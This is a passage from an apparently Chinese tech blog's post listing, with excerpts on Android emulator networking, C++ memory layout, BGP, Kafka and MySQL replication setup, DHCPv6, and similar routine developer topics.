设置dns，一般如果是通过路由器上网，可以把 dns设置为路由器的默认网关。192.168.1.1。
setprop net.dns1 192.168.1.1
另外就是设置代理了。如下：
setprop net.gprs.http-proxy 192.168.1.1:8080
重启模拟器就可以实现上网了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69d633d4a87b8cce5ab1239db9ed8677/" rel="bookmark">
			C&#43;&#43;多重继承中的内存模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++多重继承中的内存模型 C++语言通过引入虚函数表的形式来支持多态特性，并且为了解决多重继承中的冗余和二义性问题又引入了虚继承，这使得C++类的内存模型呈现出一定的复杂性。
无虚函数时多重继承的内存模型 C++要求所有实例化的对象都要有相应的内存地址，因此对一个不包含任何成员变量、成员函数的空类的实例会占用一个字节的内存空间。而非空类则按照以下规则安排其成员在内存中的排列顺序：
成员函数不占用内存空间
同一个类（不包括父类）中的成员变量在内存中按照在类中的声明次序依次排列，排列顺序与访问权限、变量名没有关系
继承自父类的成员变量排在当前类所有成员变量之前
继承自多个父类的成员变量按照类继承列表中的声明顺序依次排列每个父类中的成员变量
根据这些规则，定义下面这些类并限制他们间的继承关系，我们可以很容易的得出KTestClass类任一实例的内存模型：
class KTopClass { public: KTopClass() : m_iTopVar(0) { cout &lt;&lt; "KTopClass constructed." &lt;&lt; endl; } private: int m_iTopVar; }; class KLBaseClass : public KTopClass { public: KLBaseClass() : m_iLVar(0) { cout &lt;&lt; "KLBaseClass constructed." &lt;&lt; endl; } private: int m_iLVar; }; class KRBaseClass { public: KRBaseClass() : m_iRVar(0) { cout &lt;&lt; "KRBaseClass constructed." &lt;&lt; endl; } private: int m_iRVar; }; class KTestClass : public KLBaseClass, public KRBaseClass { private: int m_iVar1; public: KTestClass() : m_iVar1(0), m_iVar2(0) { cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69d633d4a87b8cce5ab1239db9ed8677/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1ed63c2804f84c52d915ae2419d063d/" rel="bookmark">
			view 生成 bitmap
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在开发短信祝福的时候看到别人写了一个贺卡（Imageview textview（edittext）结合），其实原理很简单就是把整个 view 生成了一个bitmap。
//重要部分 LinearLayout mCenter = (LinearLayout) findViewById(R.id.bitmap); mCenter.buildDrawingCache(); mCenter.setDrawingCacheEnabled(true); Bitmap b1 = mCenter.getDrawingCache(); 中心代码：
package com.example.sendmsg; import android.annotation.SuppressLint; import android.annotation.TargetApi; import android.app.ActionBar; import android.app.Activity; import android.app.AlertDialog; import android.app.AlertDialog.Builder; import android.app.Dialog; import android.content.DialogInterface; import android.content.Intent; import android.graphics.Bitmap; import android.graphics.Typeface; import android.os.Build; import android.os.Bundle; import android.view.View; import android.view.View.OnClickListener; import android.widget.AdapterView; import android.widget.AdapterView.OnItemClickListener; import android.widget.Button; import android.widget.EditText; import android.widget.ImageView; import android.widget.LinearLayout; import android.widget.TextView; import android.widget.Toast; public class CardViewActivity extends Activity{ private ImageView topiamge,bottomimage,answer,main_image,changeimage,changetext; private EditText content; private LinearLayout sendmsg; private LinearLayout mCenter; private TextView title; private Builder builder; private Dialog dialog; @TargetApi(Build.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1ed63c2804f84c52d915ae2419d063d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f32edab18ce8d8fe76a9b640564ee71c/" rel="bookmark">
			获取手机通讯录联系人（包含模糊查询，dialog自定义，也有一个自定义通知栏）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里还有一个联系人类：
package com.example.sendmsg; import android.graphics.Bitmap; public class ContactEntity { /** 联系人名称 **/ private String name; /** 联系人号码 **/ private String number; /** 联系人头像 **/ private Bitmap photo; public ContactEntity(String name, String number, Bitmap photo) { super(); this.name = name; this.number = number; this.photo = photo; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String getNumber() { return number; } public void setNumber(String number) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f32edab18ce8d8fe76a9b640564ee71c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3132cbe4bae04a9d1bf7239400bd957/" rel="bookmark">
			Docker使用非root用户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker使用非root用户 通常我们使用Docker的时候都是使用的root，官方说法如下：
The docker daemon binds to a Unix socket instead of a TCP port. By default that Unix socket is owned by the user root and other users can access it with sudo. For this reason, docker daemon always runs as the root user. To avoid having to use sudo when you use the docker command, create a Unix group called docker and add users to it. When the docker daemon starts, it makes the ownership of the Unix socket read/writable by the docker group.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3132cbe4bae04a9d1bf7239400bd957/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5709128a7bd4cf6f490de4adf1a470be/" rel="bookmark">
			Fatal signal 11 (SIGSEGV) 错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 06-04 09:59:32.355: A/libc(2495): Fatal signal 11 (SIGSEGV) at 0x00002600 (code=1), thread 2508 (Thread-117) This was a common error when stopping an OpenGL-ES app on Intel x86 AVD (every launch crashes at onStop()). Here's a quick solution (worked fine for JPCT-AE Engine): - Open AndroidManifest.xml, add android:allowClearUserData="true" tag to the application node. &lt;application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:theme="@style/AppTheme" android:allowClearUserData="true" &gt; May be useful for some users. 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1c83f8b17836cbc11df0cb58ba4c5c6/" rel="bookmark">
			怎么区别数据挖掘与数据分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		怎么区别数据挖掘与数据分析
数据分析（狭义）与数据挖掘的本质都是一样的，都是从数据里面发现关于业务的知识（有价值的信息），从而帮助业务运营、改进产品以及帮助企业做更好的决策。
从分析的目的来看，数据分析一般是对历史数据进行统计学上的一些分析，数据挖掘更侧重于机器对未来的预测，一般应用于分类、聚类、推荐、关联规则等。 从分析的过程来看，数据分析更侧重于统计学上面的一些方法，经过人的推理演译得到结论；数据挖掘更侧重由机器进行自学习，直接到得到结论。
从分析的结果看，数据分析的结果是准确的统计量，而数据挖掘得到的一般是模糊的结果。 “数据分析”的重点是观察数据，“数据挖掘”的重点是从数据中发现“知识规则”KDD（Knowledge Discover in Database）。 “数据分析、数据统计”得出的结论是人的智力活动结果，“数据挖掘”得出的结论是机器从学习集（或训练集、样本集）发现的知识规则。 “数据分析”需要人工建模，“数据挖掘”自动完成数学建模。 数据挖掘与数据分析的主要区别是什么 1、计算机编程能力的要求 作为数据分析很多情况下需要用到成型的分析工具，比如EXCEL、SPSS，或者SAS、R。一个完全不懂编程，不会敲代码的人完全可以是一名能好的数据分析师，因为一般情况下OFFICE包含的几个工具已经可以满足大多数数据分析的要求了。很多的数据分析人员做的工作都是从原始数据到各种拆分汇总，再经过分析，最后形成完整的分析报告。当然原始数据可以是别人提供，也可以自己提取（作为一名合格的数据分析师，懂点SQL知识是很有好处的）。 而数据挖掘则需要有编程基础。为什么这样说呢？举两个理由：第一个，目前的数据挖掘方面及相关的研究生方面绝大多数是隶属于计算机系；第二点，在招聘岗位上，国内比较大的公司挂的岗位名称大多数为“数据挖掘工程师”。从这两点就可以明确看出数据挖掘跟计算机跟编程有很大的联系。 2、在对行业的理解的能力 要想成为一名优秀的数据分析师，对于所从事的行业有比较深的了解和理解是必须要具备的，并且能够将数据与自身的业务紧密结合起来。简单举个例子来说，给你一份业务经营报表，你就能在脑海中勾画出目前经营状况图，能够看出哪里出现了问题。但是，从事数据挖掘不一定要求对行业有这么高的要求。 3、专业知识面的要求 数据分析师出对行业要了解外，还要懂得一些统计学、营销、经济、心理学、社会学等方面的知识，当然能了解数据挖掘的一些知识会更好。数据挖掘工程师则要求要比较熟悉数据库技术、熟悉数据挖掘的各种算法，能够根据业务需求建立数据模型并将模型应用于实际，甚至需要对已有的模型和算法进行优化或者开发新的算法模型。想要成为优秀的数据挖掘工程师，良好的数学、统计学、数据库、编程能力是必不可少的。 总之一句话来概括的话，数据分析师更关注于业务层面，数据挖掘工程师更关注于技术层面。 数据分析师与数据挖掘工程师的相似点： 1、都跟数据打交道。 他们玩的都是数据，如果没有数据或者搜集不到数据，他们都要丢饭碗。 2、知识技能有很多交叉点。 他们都需要懂统计学，懂数据分析一些常用的方法，对数据的敏感度比较好。 3、在职业上他们没有很明显的界限。 很多时候数据分析师也在做挖掘方面的工作，而数据挖掘工程师也会做数据分析的工作，数据分析也有很多时候用到数据挖掘的工具和模型，很多数据分析从业者使用SAS、R就是一个很好的例子。而在做数据挖掘项目时同样需要有人懂业务懂数据，能够根据业务需要提出正确的数据挖掘需求和方案能够提出备选的算法模型，实际上这样的人一脚在数据分析上另一只脚已经在数据挖掘上了。 事实上没有必要将数据分析和数据挖掘分的特别清，但是我们需要看到两者的区别和联系，作为一名数据行业的从业者，要根据自身的特长和爱好规划自己的职业生涯，以寻求自身价值的最大化。 数据分析与数据挖掘的区别 数据分析可以分为广义的数据分析和狭义的数据分析，广义的数据分析就包括狭义的数据分析和数据挖掘，我们常说的数据分析就是指狭义的数据分析。 数据分析（狭义）： （1）定义：简单来说，数据分析就是对数据进行分析。专业的说法，数据分析是指根据分析目的，用适当的统计分析方法及工具，对收集来的数据进行处理与分析，提取有价值的信息，发挥数据的作用。 （2）作用：它主要实现三大作用：现状分析、原因分析、预测分析（定量）。数据分析的目标明确，先做假设，然后通过数据分析来验证假设是否正确，从而得到相应的结论。 （3）方法：主要采用对比分析、分组分析、交叉分析、回归分析等常用分析方法； （4）结果：数据分析一般都是得到一个指标统计量结果，如总和、平均值等，这些指标数据都需要与业务结合进行解读，才能发挥出数据的价值与作用； 数据挖掘： （1）定义：数据挖掘是指从大量的数据中，通过统计学、人工智能、机器学习等方法，挖掘出未知的、且有价值的信息和知识的过程。 （2）作用：数据挖掘主要侧重解决四类问题：分类、聚类、关联和预测（定量、定性），数据挖掘的重点在寻找未知的模式与规律；如我们常说的数据挖掘案例：啤酒与尿布、安全套与巧克力等，这就是事先未知的，但又是非常有价值的信息； （3）方法：主要采用决策树、神经网络、关联规则、聚类分析等统计学、人工智能、机器学习等方法进行挖掘； （4）结果：输出模型或规则，并且可相应得到模型得分或标签，模型得分如流失概率值、总和得分、相似度、预测值等，标签如高中低价值用户、流失与非流失、信用优良中差等； 综合起来，数据分析（狭义）与数据挖掘的本质都是一样的，都是从数据里面发现关于业务的知识（有价值的信息），从而帮助业务运营、改进产品以及帮助企业做更好的决策。所以数据分析（狭义）与数据挖掘构成广义的数据分析。cda数据分析师官网 转载于:https://www.cnblogs.com/amengduo/p/9587339.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/950f12d3cff3011f34c16cb2b818c6a9/" rel="bookmark">
			BGP、IBGP、EBGP、IGP、EGP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 BGP：Border Gateway Protocol,边界网关协议，运行在自制系统间的路由协议，主要作用交换域间路由协议；
2 IBGP：Internel BGP，内部边界网关协议，如果两个交换BGP报文的对等实体属于同一个自治系统，那么这两个对等实体就是IBGP对等实体；
3 EBGP：Externel BGP，外部边界网关协议，如果两个交换BGP报文的对等实体属于不同的自治系统，那么这两个对等实体就是EBGP对等实体；
4 IGP: Interior Gateway Protocol内部网关协议，主要作用是发现和计算自治域内的路由信息，包括RIP,OSPF,IS-IS,IGRP等
5 EGP：Exterior Gateway Protocol外部网关协议，一种自治系统相邻两个网关之间交换路由信息的协议，BGP是最新的外部网关协议
6 AS 自治系统英文全称（autonomous system），意思是一组内部管理下的网络，它们之间共享同一个路由选择方法。它由地区再划分并必须由IANA分配一个单独的16位数字。地区通常连接到其他地区，使用路由器创建一个自治系统。作用就是在运行BGP等外部路由协议时用于区分不同自治系统。
一般来说，AS内部的大多数路由器只知道本AS的拓扑结构，不知道其它AS的内部拓扑，也就不能直接知道去其它AS的路由，因为IGP类协议只在AS内部运行。但AS内会有一些骨干路由器和其它AS的骨干路由器之间运行EGP类协议，这些骨干路由器知道去其它AS的路由后会把这些信息通过IGP类协议重新发布，让本AS内的路由器也知道去其它AS的路由。 实际上这可以说是一种路由的分层和聚合，因为让每个路由器都知道整个因特网的拓扑是不现实和可笑的，所有才把网络划分成不同的AS，简化了网络，就像DNS分一级域名和二级域名一样。 另外，IGP和BGP不能直接比较，因为不是一个层次的，IGP是内部网关协议，对应的是EGP即外部网关协议。IGP分RIP、OSPF等，而BGP只是EGP的一种
我们知道,在自治系统内部使用IGP路由协议,而在不同自治系统之间使用BGP路由协议(严格来讲,BGP不是路由协议).BGP产生的原因是为了在不同自治系统(AS)之间进行路由转发,而其中又提出了EBGP和IBGP两种,EBGP用于在不同自治系统之间,但IBGP,书上说它是应用于自治系统内部,可是在自治系统内部我们是使用IGP.这就和"BGP是应用于不同自治系统之间"产生矛盾,那么IBGP存在的意义,比如说某种情况,需要使用到IBGP,它在网络中起到的作用.EBGP与IBGP之间的区别,EBGP在网络中又起什么作用?
为什么要有IBGP，原因如下：
1、IGP的能力限制，IGP处理路由的条目有限，而目前internet上核心路由器的路由表已经超过10万条。假如没有IBGP，那么这些路由只能采取重分发的方式直接导入到IGP中，这样做的缺点很明显：第一，IGP协议的作者并没有打算让IGP来处理如此大量的路由，IGP本身也无法处理这样大的路由数量；第二，如果非要让IGP来处理，那么根据IGP的处理原则，假如这10万路由中任何一条路由发生变化，那么运行IGP的路由器就不得不重新计算路由，更为严重的是，假如其中某一条路由出现路由抖动的情况，例如端口反复UP/DOWN，这会导致所有的IGP路由器每时每刻都不得不把10万条路由重新计算一遍，这种计算量对于绝大多数路由器来说是无法负担的。另外对于运行RIP V1的路由器来说，10万条路由的定期更新，这根本就是无法接受的事情，除去带宽占用率不谈，我想，也只有少量高端的GSR以及TSR能够有这样的性能吧。很显然，我们不可能让网络中所有的路由器都是GSR和TSR，如果真是这样，那么Cisco、juniper以及华为等厂家就要偷笑了。例如:AS100----AS200---AS300，假定AS100/200/300各有100台路由器，而AS100中有1W条路由要传递要AS300中，而AS200的路由器不需要学习AS100的路由。如果没有IBGP的话，那么这1W条路由都必须被重分发到AS200的IGP中去，这样的话，相当于AS200中所有的100台路由器都增加了1W条路由。如果利用IBGP的话，那么AS200中只有运行IBGP的路由器会学习到这1W条路由，其它运行IGP的路由器都不会学习到这1W条路由。并且由于BGP的路由控制能力大大强于IGP的路由控制能力，因此运行IBGP的路由器比运行IGP的路由器能更好的对这1W条路由做一些路由策略的处理，从而保证整个AS内部的路由器学习到的路由数目可以控制在可接受的范围之内。
2、路由环路的问题。BGP是靠路由属性来防止路由环路的，例如AS_PATH属性，假如说没有IBGP协议，那么当所有BGP路由重分发到IGP中后，路由属性必然丢失，这就破坏了BGP的路由环路防止机制，产生了路由环路的隐患。
那么引申一下，既然IBGP能够传送所有的路由前缀，为什么还需要IGP？
1、IBGP之间是TCP连接，也就意味着IBGP邻居采用的是逻辑连接的方式，两个IBGP连接不一定存在实际的物理链路。所以需要有IGP来提供路由，以完成BGP路由的递归查找。
2、BGP协议本身实际上并不发现路由，BGP将路由发现的工作全部移交给了IGP协议，它本身着重于路由的控制。因此，如果没有IGP，那么BGP也就毫无用处了。
EBGP与IBGP的区别：
1、路由环路的避免措施不一样，IBGP强制规定ibgp speaker不允许把从一个ibgp邻居学习到的前缀传递给其它ibgp邻居，因此IBGP要求逻辑全连接。EBGP没有这样的要求，EBGP对路由环路的避免是通过AS_PATH属性来实现的。
2、使用的BGP属性不同，例如IBGP可以传递LOCAL_PREF（本地优先属性），而EBGP不行。
3、IBGP有同步的要求，而EBGP没有同步的要求
4、IBGP不需要IBGP邻居之间有物理连接，只需要逻辑连接即可，而EBGP下一般情况下都要求EBGP邻居之间存在物理连接。
EBGP在网络中起什么作用？这个题目太大了，EBGP我认为是在不同的AS之间提供路由的传递以及路由的控制，了解了BGP属性的用法，也就了解了EBGP的作用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bcab197025129241d8501649e37e6009/" rel="bookmark">
			使用高德地图获取拍照图片地理位置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.寻找Terminal
配置环境变量
你需要将你的SDK中adb目录配置在path环境变量中
例如：
D:\android-sdk2\android-sdk\platform-tools
然后将其添加到环境变量Path路径下 大家这样很直观吧
然后打开cmd输入adb shell测试 这样即为成功。但是我们还需要对cmd做一些属性设置 做完这些之后，重启你的as，就可以使用terminal了 2.如何获取sha1？
开发模式（debug）和发布模式（release）下的 sha1 值是不同的，发布 apk时 需要根据发布apk对应的keystore重新配置Key，获取发布模式下的sha1的方法请参考方法二。
下面介绍获取 Sha1 值的方法。
通过Eclipse获取SHA1：
使用 adt 22 以上版本，可以在 eclipse 中直接查看。Windows：依次在 eclipse 中打开 Window -&gt; Preferances -&gt; Android -&gt; Build。Mac：依次在 eclipse 中打开 Eclipse/ADT-&gt;Preferances -&gt; Android -&gt; Build。在弹出的 Build 对话框中 “SHA1 fingerprint” 中的值即为 Android 签名证书的 Sha1 值，如下图所示： 通过Android Studio获取SHA1：
第一步、打开Android Studio的Terminal工具
第二步、输入命令：D:\Java\jdk1.8.0_91\bin\keytool -v -list -keystore +keystore文件路径
第三步、输入Keystore密码 使用 keytool（jdk自带工具）获取SHA1：
，按照如下步骤进行操作：
1.运行进入控制台。 2.在弹出的控制台窗口中输入 cd .android 定位到 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bcab197025129241d8501649e37e6009/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8223d7198e23eff0c4d6cee28d1a940/" rel="bookmark">
			P图两张
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 下午闲来无事，P了两张图，自觉地还有几分成就感。 工具：Photoshop CC 2014版本。
铅笔素描 彩铅素描 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f9d5d93341e972e390500a09d794af3/" rel="bookmark">
			vtkInteractorStyleRubberBandPick 类简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		类的继承图
简介：
该类主要用橡皮筋矩形拾取 props.
Like TrackBallCamera, but this can pick props underneath a rubber band selection rectangle.
用户可以通过鼠标左键或者“r”键画一个矩形。当鼠标释放的时候，附加的拾取器可以操作所选矩形中间的像素值。 如果拾取器是 vtkAreaPicker，可以操作整个所选的矩形。
键盘“P”： 1*1 的矩形框。
This interactor style allows the user to draw a rectangle in the render window by hitting 'r' and then using the left mouse button. When the mouse button is released, the attached picker operates on the pixel in the center of the selection rectangle. If the picker happens to be a vtkAreaPicker it will operate on the entire selection rectangle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f9d5d93341e972e390500a09d794af3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d16194fe66e4caa974c86c32455ffbb7/" rel="bookmark">
			Codeforces 711D  dfs找环
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		D. Directed Roads time limit per test 2 seconds memory limit per test 256 megabytes input standard input output standard output ZS the Coder and Chris the Baboon has explored Udayland for quite some time. They realize that it consists of n towns numbered from 1 to n. There are n directed roads in the Udayland. i-th of them goes from town i to some other town ai (ai ≠ i).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d16194fe66e4caa974c86c32455ffbb7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7eb129446a0721273ed0af28fb47b07f/" rel="bookmark">
			ngrok.net 国内ngrok资源网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新发现的一个网站，罗列了国内相关的ngrok内网穿透相关资源。
https://ngrok.net/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4347517d6085df728fc5b3a5fc8eb9f/" rel="bookmark">
			MTK6580(Android6.0)-使用DTS注册平台设备、匹配平台驱动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、初始化device tree file:kernel-3.18/init/main.c asmlinkage __visible void __init start_kernel(void) { ... setup_arch(&amp;command_line); ... } file:kernel-3.18/arch/arm64/kernel/setup.c void __init setup_arch(char **cmdline_p) {	... unflatten_device_tree(); ... } 文件：kernel-3.18/drivers/of/fdt.c /** * unflatten_device_tree - create tree of device_nodes from flat blob * * unflattens the device-tree passed by the firmware, creating the * tree of struct device_node. It also fills the "name" and "type" * pointers of the nodes so the normal device-tree walking functions * can be used.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4347517d6085df728fc5b3a5fc8eb9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c0aedb271b246bf29ca6048631026d5/" rel="bookmark">
			webrtc的Sqrt（）快速计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		webrtc的Sqrt（）快速计算
/* * Copyright (c) 2011 The WebRTC project authors. All Rights Reserved. * * Use of this source code is governed by a BSD-style license * that can be found in the LICENSE file in the root of the source * tree. An additional intellectual property rights grant can be found * in the file PATENTS. All contributing project authors may * be found in the AUTHORS file in the root of the source tree.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c0aedb271b246bf29ca6048631026d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48cc91b5ddfde03261f99b180456b55c/" rel="bookmark">
			Genymotion模拟器安装Genymotion-ARM-Translation变copy的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以前记得直接把Genymotion-ARM-Translation_v1.zip拖进去就能安装成功。 现在在mac上试了最新的genymotion,拖进去后变成Files successfully copied to: /sdcard/Download
解决办法：
直接自己手动flash 这个archive.
1. adb shell
2. cd /sdcard/Download/
3. sh /system/bin/flash-archive.sh /sdcard/Download/Genymotion-ARM-Translation_v1.2.zip
4, 重启模拟器。
OK
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0089223549e53dc5c98caa33708eb1e/" rel="bookmark">
			Kafka安装（windows）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kafka 简介 是一个分布式消息队列，高吞吐量，使用Scala实现。
安装 1.安装JDK
2.下载zookeeper和kafka,解压到某个目录下面，比如我的是 D:\dev
3.修改zookeeper的配置文件，位于D:\dev\zookeeper-3.4.8\conf,把zoo_sample.cfg重命名为zoo.cfg，修改里面的存储目录dataDir和端口号。 # the directory where the snapshot is stored. # do not use /tmp for storage, /tmp here is just example sakes. dataDir=D:\dev\zookeeper-3.4.8\data # the port at which the clients will connect clientPort=2181 4.启动zookeeper（运行bin下面的zkServer，或者修改环境变量path）。
5.修改kafka配置（server.properties），主要看到里面配置了zookeeper的地址信息，这里在本机。
6.启动kafka server，启动脚本是D:\dev\kafka_2.11-0.10.0.1\bin\kafka-server-start.sh，后面的类似。
D:\dev\kafka_2.11-0.10.0.1&gt;.\bin\windows\kafka-server-start.bat .\config\server. properties 7.创建一个topic，如”test2”。
D:\dev\kafka_2.11-0.10.0.1&gt;.\bin\windows\kafka-topics.bat --create --zookeeper l ocalhost:2181 --replication-factor 1 --partitions 1 --topic test2 8.打开消息生成者和消费者，然后可以看到生产者发送的消息会到达消费者。
D:\dev\kafka_2.11-0.10.0.1&gt;.\bin\windows\kafka-console-producer.bat --broker-lis t localhost:9092 --topic test2 D:\dev\kafka_2.11-0.10.0.1&gt;.\bin\windows\kafka-console-consumer.bat --zookeeper localhost:2181 --topic test2 小结 慢慢摸索。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d92c243abc3d018618420c63c7f8414/" rel="bookmark">
			损坏的主控文件表,CHKDSK被终止.如何恢复数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 这种情况是分区结构出现异常。引起的分区错误。单击右键属性看到的是RAW格式。移动硬盘的话，很大程度是因为强拔之类的操作，也可能是坏道。病毒，硬盘本身质量问题引起的。因为系统读取移动硬盘信息困难，引起系统假死。 一定不要重分区，格式化之类的操作。那样的话恢复的数据不完整。保持现状。正确的分析处理很大程度上是可以完整的恢复出原来的数据的。而不需要数据恢复软件扫描恢复。 单纯使用数据恢复软件扫描恢复的话，耗时，效果也很难说。 我恢复过很多你这种情况的，很多时候都是100%完整恢复原来的分区..这些分区的数据的，出现这种问题的关键是要保护好出现问题的硬盘状态。 如果要自己尝试恢复，参考使用数据恢复软件扫描恢复，记住不要对出现问题的硬盘写入找到的文件。而应该把找到的数据先恢复到别的硬盘上。确定正确后再处理出现问题的分区。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eeb446dc3a0e44dafa5d6eb4b40c9d50/" rel="bookmark">
			Linux下MySQL主从配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.两台Linux安装同一版本的MySQL。 2.保证主从服务器数据库内容一致。 3.master服务器配置 3.1创建一个有复制权限的用户，只限slave远程连接访问（为了方便我给了repuser所有权限） mysql&gt;GRANT REPLICATION SLAVE ON *.* to 'repuser'@'%' identified by '123456'; mysql&gt;flush privileges; 3.2编辑mysql的配置文件 my.cnf中设置两个必须的参数，没有的添加，有的直接更改即可。 log-bin=mysql-bin server-id = 1 保存之后，重启服务。 3.3查看master状态，记录下两个参数 mysql&gt; show master status; +------------------+----------+--------------+------------------+-------------------+ File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set | +------------------+----------+--------------+------------------+-------------------+ | mysql-bin.000012 | 346 | | | | +------------------+----------+--------------+------------------+-------------------+ 1 row in set 4.slave服务器配置 4.1编辑mysql的配置文件 my.cnf中设置两个必须的参数，没有的添加，有的直接更改即可。 log-bin=mysql-bin server-id = 2 保存之后，重启服务。 4.2slave服务器重启后，登录mysql mysql&gt;stop slave; mysql&gt;change master to master_host='192.168.1.108',master_port=3307,master_user='repuser',master_password='123456',master_log_file='mysql-bin.000012',master_log_pos=346; mysql&gt;start slave; 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eeb446dc3a0e44dafa5d6eb4b40c9d50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/670c4a07685c20795fb8811adfc2aa42/" rel="bookmark">
			DHCP V6 server配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DHCPV6 server 配置
dhcp enable ipv6
dhcpv6 pool HW
address prefix 3000::/64 excluded-address 3000::1 dns-server 4000::1 dns-domain-name hw dns-domain-name hw.com
interface GigabitEthernet0/0/0
ipv6 enable ipv6 address 3000::1/64 dhcpv6 server HW
dhcpv6 client 配置
ipv6 dhcp enable
interface GigabitEthernet0/0/0
ipv6 enable ipv6 address auto link-local
ipv6 address auto dhcp
查看：dis ipv6 interface GigabitEthernet 0/0/0
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ff4cb0a840a4c3aa2a4ea7c1b493d92/" rel="bookmark">
			微信支付无法回调 APP端
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信支付服务端的回调网上已经有很多例子了，如果你一直专注于服务端开发，那么应该是非常轻松的搞定，就是别忘了对业务数据处理加锁，因为微信会重复发来消息通知而造成数据重入的混乱。
我想说说手机端Android开发的回调如何处理，也许大家使用原生的开发比较多，所以依照微信的官方文档处理就应该能够解决，但是对于使用AngularJS+Ionic+Cordova的Hybrid混合开发的小伙伴来说就不是能够顺畅解决的状况了。
网上的大牛写的一个完整的Cordova Plugin形式的微信插件，大家可以借鉴一下： https://github.com/xu-li/cordova-plugin-wechat/blob/develop/src/android/Wechat.java 大家也许已经有了这个链接，我看很多小伙伴也已经安装上了，但是对应到自己的项目中又会出现很多的Issue，我发现很多人也是出现了同样的问题，微信客户端回调自己的APP的时候回不来，很多人是出现自己的APP会全部退出然后重新登录到APP首页。
根本的原因就是，微信作为公网上的一个提供服务的接口，他要找到各个具体的APP只能通过你在微信中注册的信息来识别，就如同微信是一个送货小哥，你不提供具体的街道地址门牌号你让小哥怎么给你送货上门呢。
所以接下来我会说到具体的解决方案，在此之前还需要回到大牛的链接，因为插件形式开发微信支付都会走同一个套路，大牛提供的是完美的，其中最核心的，我认为，就是微信的Activity类（WXPayEntryActivity.java）和你自己开发的插件类（PayPlugin.java这是我自己项目中的类，这个类中就可以写调起微信支付或者支付宝支付等等）之间如何通信的问题。
